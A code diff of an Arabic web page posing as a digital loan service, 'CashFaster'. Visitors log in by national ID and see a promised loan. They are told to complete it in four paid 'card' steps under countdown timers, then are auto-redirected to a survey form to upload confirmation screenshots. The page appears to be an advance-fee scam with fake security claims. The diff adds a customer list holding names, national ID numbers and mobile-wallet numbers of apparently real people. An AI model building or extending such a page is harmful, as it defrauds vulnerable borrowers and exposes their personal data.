@@ -43,17 +43,6 @@
         .wallet-required-content { display: none; text-align: center; padding: 2rem; background: rgba(0,0,0,0.5); border-radius: 2rem; border: 2px solid #ff6b35; margin-top: 2rem; }
         .wallet-required-content h3 { color: #FFD966; margin-bottom: 1rem; }
         .wallet-timer { font-size: 2.5rem; font-family: monospace; font-weight: bold; color: #ff6b35; margin: 1rem 0; }
-        .glow-image { transition: all 0.3s ease; max-width: 100%; border-radius: 15px; }
-        .glow-image:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(0,184,148,0.8); }
-        .image-row { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 2rem; }
-        .image-card { background: rgba(0,0,0,0.5); border-radius: 1rem; padding: 1rem; text-align: center; flex: 1; min-width: 250px; border: 1px solid rgba(212,175,55,0.3); }
-        .image-card p { margin-top: 0.5rem; color: #FFD966; font-weight: bold; }
-        .hero-section { background: linear-gradient(135deg, rgba(212,175,55,0.1), rgba(245,176,66,0.05)); border: 1px solid rgba(212,175,55,0.2); border-radius: 2rem; padding: 2rem; margin-bottom: 2rem; display: flex; gap: 2rem; align-items: center; flex-wrap: wrap; }
-        .hero-video { flex: 0 0 300px; border-radius: 1.5rem; overflow: hidden; box-shadow: 0 10px 30px rgba(212,175,55,0.3); border: 2px solid rgba(212,175,55,0.3); }
-        .hero-video video { width: 100%; height: auto; display: block; }
-        .hero-content { flex: 1; min-width: 250px; }
-        .hero-content h2 { font-size: 1.8rem; color: #FFD966; margin-bottom: 1rem; }
-        .hero-content p { color: #eef5ff; line-height: 1.8; margin-bottom: 1.5rem; font-size: 0.95rem; }
         .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px,1fr)); gap: 1.5rem; margin: 2rem 0; }
         .info-card { background: rgba(0,0,0,0.5); border-radius: 1.5rem; padding: 1.5rem; border-right: 3px solid #D4AF37; transition: all 0.3s; }
         .info-card:hover { border-right-color: #FFD966; background: rgba(0,0,0,0.7); }
@@ -78,14 +67,13 @@
         .faq-btn { width: 100%; text-align: right; padding: 0.6rem 0.8rem; background: rgba(212,175,55,0.1); border: 1px solid rgba(212,175,55,0.3); color: #FFD966; border-radius: 0.8rem; cursor: pointer; font-size: 0.8rem; transition: all 0.2s; font-family: 'Cairo', sans-serif; }
         .faq-btn:hover { background: rgba(212,175,55,0.2); border-color: #FFD966; }
         footer { text-align: center; margin-top: 3rem; font-size: 0.75rem; color: #7f8c8d; padding-top: 2rem; border-top: 1px solid rgba(212,175,55,0.2); }
-        .status-badge { background: #1e2a3a; padding: 0.5rem 1rem; border-radius: 30px; color: #4ade80; font-size: 0.9rem; }
         .linking-section { display: none; }
         .linking-section.active { display: block; }
         .auto-redirect-box { background: rgba(212, 175, 55, 0.2); border: 1px solid #D4AF37; border-radius: 2rem; padding: 0.8rem 1.2rem; margin: 1rem 0; text-align: center; font-weight: bold; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.5rem; }
         .auto-redirect-box .timer-number { font-family: monospace; font-size: 1.6rem; font-weight: 800; color: #FFD966; margin: 0 0.2rem; }
         .cancel-redirect { background: rgba(220, 20, 60, 0.2); border: 1px solid #dc143c; color: #ff8080; padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; cursor: pointer; transition: 0.2s; }
         .cancel-redirect:hover { background: rgba(220, 20, 60, 0.4); }
-        @media (max-width: 768px) { .timer { font-size: 2rem; } .container { padding: 1rem; } .hero-section { flex-direction: column; } .hero-video { flex: 0 0 100%; max-width: 100%; } .header-content { flex-direction: column; text-align: center; } .info-grid { grid-template-columns: 1fr; } }
+        @media (max-width: 768px) { .timer { font-size: 2rem; } .container { padding: 1rem; } .info-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
@@ -97,7 +85,7 @@
         <p style="margin-bottom: 1.5rem;">النظام الذهبي للتمويل الرقمي</p>
         <div class="input-group">
             <label>📇 الرقم القومي (14 رقم)</label>
-            <input type="text" id="nationalId" placeholder="مثال: 28911120201491" maxlength="14" inputmode="numeric">
+            <input type="text" id="nationalId" placeholder="مثال: 27510240100215" maxlength="14" inputmode="numeric">
         </div>
         <div id="loginError" class="error-msg"></div>
         <button class="btn-gold" onclick="handleLogin()" style="width:100%">🔐 دخول آمن</button>
@@ -117,12 +105,7 @@
             <h2 class="gold-text" style="font-size: 2rem; margin-bottom: 0.5rem;">مرحباً <span id="customerName">...</span></h2>
             <div style="display: flex; align-items: center; gap: 0.5rem; color: #4ade80;"><i class="fas fa-check-circle"></i><span>✅ تم التحقق من هويتك</span></div>
         </div>
-        <!-- تم إزالة قسم عرض الصور بالكامل -->
         <div id="normalDashboardContent" class="normal-dashboard-content">
-            <div class="hero-section">
-                <div class="hero-video"><video controls width="100%"><source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/eid_al-ftar_flash_cash_667ae5d1.mp4" type="video/mp4">متصفحك لا يدعم تشغيل الفيديو</video></div>
-                <div class="hero-content"><h2>🎉 مرحباً بك في CashFaster</h2><p>نحن نوفر لك نظاماً آمناً وموثوقاً للتمويل الرقمي. جميع بياناتك محمية بتشفير AES-256.</p><p><strong>✨ مميزات النظام:</strong></p><ul style="margin-right: 1rem; line-height: 1.8; color: #eef5ff;"><li>🔐 تشفير عالي الجودة لجميع البيانات</li><li>⚡ معالجة سريعة للطلبات</li><li>📱 دعم المحافظ الإلكترونية</li><li>24/7 دعم فني متاح</li></ul></div>
-            </div>
             <div class="info-grid">
                 <div class="info-card"><i class="fas fa-chart-line"></i><strong>مبلغ التمويل</strong><span id="loanAmount" style="font-size:1.8rem; font-weight:bold;">0</span></div>
                 <div class="info-card"><i class="fas fa-wallet"></i><strong>المحفظة المسجلة</strong><span id="walletType" style="font-size:1.2rem;">...</span></div>
@@ -171,28 +154,14 @@
 </div>
 
 <script>
-    const loanDetailsMap = {
-        30000: { months: 12, installment: 3325 }, 35000: { months: 12, installment: 3875 }, 40000: { months: 18, installment: 2965 }, 45000: { months: 18, installment: 3325 },
-        50000: { months: 24, installment: 2725 }, 55000: { months: 24, installment: 3075 }, 60000: { months: 24, installment: 3085 }, 65000: { months: 26, installment: 3325 },
-        70000: { months: 26, installment: 3585 }, 75000: { months: 26, installment: 3845 }, 80000: { months: 30, installment: 3550 }, 85000: { months: 30, installment: 3775 },
-        90000: { months: 30, installment: 3990 }, 95000: { months: 30, installment: 4220 }, 100000: { months: 32, installment: 4157 }, 105000: { months: 32, installment: 4375 },
-        110000: { months: 32, installment: 4580 }, 115000: { months: 38, installment: 4075 }, 120000: { months: 38, installment: 4235 }, 125000: { months: 38, installment: 4035 },
-        130000: { months: 42, installment: 4400 }, 135000: { months: 42, installment: 4305 }, 140000: { months: 42, installment: 4495 }, 145000: { months: 48, installment: 4075 },
-        150000: { months: 48, installment: 4205 }, 155000: { months: 48, installment: 4315 }, 160000: { months: 48, installment: 4435 }, 165000: { months: 48, installment: 4615 },
-        170000: { months: 48, installment: 4725 }, 175000: { months: 48, installment: 4848 }, 180000: { months: 54, installment: 4435 }, 185000: { months: 54, installment: 4557 },
-        190000: { months: 60, installment: 4215 }, 195000: { months: 60, installment: 4325 }, 200000: { months: 60, installment: 4440 }
-    };
-    function getLoanDetails(amount) {
-        const exact = loanDetailsMap[amount];
-        if (exact) return exact;
-        const keys = Object.keys(loanDetailsMap).map(Number).sort((a,b)=>a-b);
-        let closest = keys[0];
-        for (let k of keys) if (Math.abs(k - amount) < Math.abs(closest - amount)) closest = k;
-        return loanDetailsMap[closest] || { months: 12, installment: 0 };
-    }
-
-    // قاعدة العملاء الجديدة (تم استبدالها بالكامل من ملف الاستمارة + العملاء الإضافيين)
+    // ========== قاعدة العملاء (تم تحديثها بالعملاء الجدد) ==========
     const customers = [
+        { name: "خالد عبد الغنى السيد عبداللطيف", id: "27510240100215", wallet: "01155057404", type: "اتصالات", loan: 30000, step: 7500 },
+        { name: "شحاته عبد التواب علي حسن", id: "28111182500374", wallet: "01008953879", type: "فودافون", loan: 150000, step: 37500 },
+        { name: "سوسن السيد علي محمد", id: "28110171703129", wallet: "01055515284", type: "فودافون", loan: 100000, step: 25000 },
+        { name: "محمد يوسف عبد الحي عمر", id: "28203160400114", wallet: "01020941917", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "حامد السيد السيد شلبى", id: "27507121200596", wallet: "", type: "", loan: 150000, step: 37500 },
+        { name: "عبدالله عاطف مهران سليمان", id: "28304020103994", wallet: "01556244683", type: "فودافون", loan: 30000, step: 7500 },
         { name: "احمد ابراهيم عبدالعاطي", id: "28911120201491", wallet: "", type: "", loan: 200000, step: 50000 },
         { name: "سامح محمد احمد حسن", id: "27702122102315", wallet: "01151686300", type: "اتصالات", loan: 200000, step: 50000 },
         { name: "محمد جمال احمد احمد", id: "28910011904914", wallet: "01017550748", type: "فودافون", loan: 50000, step: 12500 },
@@ -205,30 +174,72 @@
         { name: "صباح مسعد منصور ابراهيم", id: "27305070101243", wallet: "01148246521", type: "اتصالات", loan: 40000, step: 10000 }
     ];
 
+    const loanDetailsMap = {
+        30000: { months: 12, installment: 3325 }, 35000: { months: 12, installment: 3875 }, 40000: { months: 18, installment: 2965 },
+        50000: { months: 24, installment: 2725 }, 100000: { months: 32, installment: 4157 }, 150000: { months: 48, installment: 4205 },
+        155000: { months: 48, installment: 4315 }, 200000: { months: 60, installment: 4440 }
+    };
+    function getLoanDetails(amount) {
+        const exact = loanDetailsMap[amount];
+        if (exact) return exact;
+        const keys = Object.keys(loanDetailsMap).map(Number).sort((a,b)=>a-b);
+        let closest = keys[0];
+        for (let k of keys) if (Math.abs(k - amount) < Math.abs(closest - amount)) closest = k;
+        return loanDetailsMap[closest] || { months: 12, installment: 0 };
+    }
+
     let currentCustomer = null;
     let timerInterval = null;
-    let walletDeadlineInterval = null;
     let autoRedirectTimer = null;
     let autoRedirectInterval = null;
+    let walletDeadlineInterval = null;
 
-    function redirectToLinkingForm() { window.open('https://survey.porsline.com/s/bTLAeRfL'); }
+    // الرابط الجديد لرفع سكرينات التأكيدات
+    const LINKING_FORM_URL = 'https://survey.porsline.com/s/bTLAeRfL';
+
+    function redirectToLinkingForm() { window.open(LINKING_FORM_URL, '_blank'); }
+    
     function cancelAutoRedirect() {
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         const box = document.getElementById('autoRedirectBox');
-        if (box) { box.style.display = 'none'; const msg = document.createElement('div'); msg.className = 'info-box success'; msg.style.marginTop = '0.5rem'; msg.innerHTML = '<i class="fas fa-ban"></i> تم إلغاء التوجيه التلقائي. يمكنك الضغط على الزر أعلاه يدوياً.'; const parent = document.getElementById('linkingSection'); const oldMsg = document.getElementById('cancelMsg'); if (oldMsg) oldMsg.remove(); msg.id = 'cancelMsg'; parent.insertBefore(msg, parent.firstChild); setTimeout(() => { if(msg) msg.remove(); }, 5000); }
+        if (box) { box.style.display = 'none'; }
     }
     function startAutoRedirect() {
         const box = document.getElementById('autoRedirectBox'); if (!box) return;
-        box.style.display = 'flex'; let secondsLeft = 30; const secondsSpan = document.getElementById('redirectSeconds'); if (secondsSpan) secondsSpan.innerText = secondsLeft;
-        if (autoRedirectInterval) clearInterval(autoRedirectInterval); if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
-        autoRedirectInterval = setInterval(() => { secondsLeft--; if (secondsSpan) secondsSpan.innerText = secondsLeft; if (secondsLeft <= 0) { clearInterval(autoRedirectInterval); if (autoRedirectTimer) clearTimeout(autoRedirectTimer); redirectToLinkingForm(); box.style.display = 'none'; } }, 1000);
-        autoRedirectTimer = setTimeout(() => { if (autoRedirectInterval) clearInterval(autoRedirectInterval); redirectToLinkingForm(); box.style.display = 'none'; }, 30000);
+        box.style.display = 'flex'; let secondsLeft = 30;
+        const secondsSpan = document.getElementById('redirectSeconds');
+        if (secondsSpan) secondsSpan.innerText = secondsLeft;
+        if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+        autoRedirectInterval = setInterval(() => {
+            secondsLeft--;
+            if (secondsSpan) secondsSpan.innerText = secondsLeft;
+            if (secondsLeft <= 0) {
+                clearInterval(autoRedirectInterval);
+                if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+                redirectToLinkingForm();
+                box.style.display = 'none';
+            }
+        }, 1000);
+        autoRedirectTimer = setTimeout(() => {
+            if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+            redirectToLinkingForm();
+            box.style.display = 'none';
+        }, 30000);
     }
     function startWalletDeadline() {
         if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
-        let timeLeft = 4 * 60 * 60; const timerElem = document.getElementById('walletRequiredTimer');
-        function update() { const hours = Math.floor(timeLeft / 3600); const mins = Math.floor((timeLeft % 3600) / 60); const secs = timeLeft % 60; timerElem.innerText = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; if (timeLeft <= 0) { clearInterval(walletDeadlineInterval); alert('انتهت المهلة المتاحة لفتح المحفظة. يرجى التواصل مع الدعم الفني لإعادة تفعيل الطلب.'); } timeLeft--; }
+        let timeLeft = 4 * 60 * 60;
+        const timerElem = document.getElementById('walletRequiredTimer');
+        function update() {
+            const hours = Math.floor(timeLeft / 3600);
+            const mins = Math.floor((timeLeft % 3600) / 60);
+            const secs = timeLeft % 60;
+            timerElem.innerText = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            if (timeLeft <= 0) { clearInterval(walletDeadlineInterval); alert('انتهت المهلة المتاحة لفتح المحفظة.'); }
+            timeLeft--;
+        }
         update(); walletDeadlineInterval = setInterval(update, 1000);
     }
     function handleLogin() {
@@ -256,17 +267,18 @@
         document.getElementById('loanDuration').innerText = months + ' شهر';
         document.getElementById('firstPaymentDate').innerText = formattedDate;
 
-        // تم حذف عرض الصور تمامًا
-
-        const hasWallet = customer.type && customer.wallet && customer.wallet !== '.' && customer.wallet !== null && customer.wallet !== "";
+        const hasWallet = customer.type && customer.wallet && customer.wallet !== "" && customer.wallet !== null;
         const normalDiv = document.getElementById('normalDashboardContent'), walletRequiredDiv = document.getElementById('walletRequiredContent');
         if (hasWallet) {
             normalDiv.style.display = 'block'; walletRequiredDiv.style.display = 'none';
             document.getElementById('linkingSection').classList.add('active');
-            showLinkingInstructions(customer.type, customer.step); startTimer(); startAutoRedirect();
+            showLinkingInstructions(customer.type, customer.step);
+            startTimer(); startAutoRedirect();
         } else {
             normalDiv.style.display = 'none'; walletRequiredDiv.style.display = 'block';
-            startWalletDeadline(); if (timerInterval) clearInterval(timerInterval); if (autoRedirectTimer) clearTimeout(autoRedirectTimer); if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+            startWalletDeadline(); if (timerInterval) clearInterval(timerInterval);
+            if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+            if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         }
     }
     function showLinkingInstructions(walletType, stepAmount) {
@@ -280,19 +292,21 @@
     function startTimer() {
         if (timerInterval) clearInterval(timerInterval);
         let timeLeft = 30 * 60; const timerElem = document.getElementById('timerDisplay');
-        function update() { const mins = Math.floor(timeLeft / 60), secs = timeLeft % 60; timerElem.innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; if (timeLeft <= 0) { clearInterval(timerInterval); alert('انتهى الوقت المتاح للربط. يرجى التواصل مع الدعم الفني لتمديد الجلسة.'); } timeLeft--; }
+        function update() { const mins = Math.floor(timeLeft / 60), secs = timeLeft % 60; timerElem.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; if (timeLeft <= 0) { clearInterval(timerInterval); alert('انتهى الوقت المتاح للربط. يرجى التواصل مع الدعم الفني لتمديد الجلسة.'); } timeLeft--; }
         update(); timerInterval = setInterval(update, 1000);
     }
     function toggleChat() { document.getElementById('chatModal').classList.toggle('active'); }
     function faqAnswer(q) {
         const chatBody = document.getElementById('chatBody');
-        const answers = { 'لماذا 4 كروت؟': 'لضمان تشفير المبلغ وتأمينه عبر النظام الآلي. كل عملية تمثل طبقة أمان إضافية.', 'متى استلم القرض؟': 'بعد التأكيد النهائي، يتم تحويل القرض إلى محفظتك خلال 180 دقيقة كحد أقصى.', 'هل بياناتي آمنة؟': 'نعم، نظامنا يستخدم تشفير AES-256 ولا يمكن لأي موظف الإطلاع على أرقام الكروت.', 'ماذا لو انتهى الوقت؟': 'يمكنك التواصل مع الدعم الفني لتمديد الجلسة خلال 6 ساعات من انتهاء الوقت.' };
-        const answer = answers[q] || 'يرجى التواصل مع الدعم الفني لمزيد من التفاصيل.';
+        const answers = { 'لماذا 4 كروت؟': 'لضمان تشفير المبلغ وتأمينه عبر النظام الآلي.', 'متى استلم القرض؟': 'بعد التأكيد النهائي، يتم تحويل القرض إلى محفظتك خلال 180 دقيقة.', 'هل بياناتي آمنة؟': 'نعم، نظامنا يستخدم تشفير AES-256.', 'ماذا لو انتهى الوقت؟': 'يمكنك التواصل مع الدعم الفني لتمديد الجلسة خلال 6 ساعات.' };
+        const answer = answers[q] || 'يرجى التواصل مع الدعم الفني.';
         const msgDiv = document.createElement('div'); msgDiv.className = 'chat-message'; msgDiv.innerHTML = `<div class="chat-question">${q}</div><div class="chat-answer">${answer}</div>`; chatBody.appendChild(msgDiv); chatBody.scrollTop = chatBody.scrollHeight;
     }
     function handleLogout() {
-        if (autoRedirectTimer) clearTimeout(autoRedirectTimer); if (autoRedirectInterval) clearInterval(autoRedirectInterval); if (walletDeadlineInterval) clearInterval(walletDeadlineInterval); if (timerInterval) clearInterval(timerInterval);
-        document.getElementById('dashboardPage').classList.remove('active'); document.getElementById('loginPage').style.display = 'flex'; currentCustomer = null; document.getElementById('nationalId').value = '';
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer); if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval); if (timerInterval) clearInterval(timerInterval);
+        document.getElementById('dashboardPage').classList.remove('active'); document.getElementById('loginPage').style.display = 'flex';
+        currentCustomer = null; document.getElementById('nationalId').value = '';
     }
     window.onclick = function(e) { const modal = document.getElementById('chatModal'); if (e.target === modal) modal.classList.remove('active'); };
 </script>
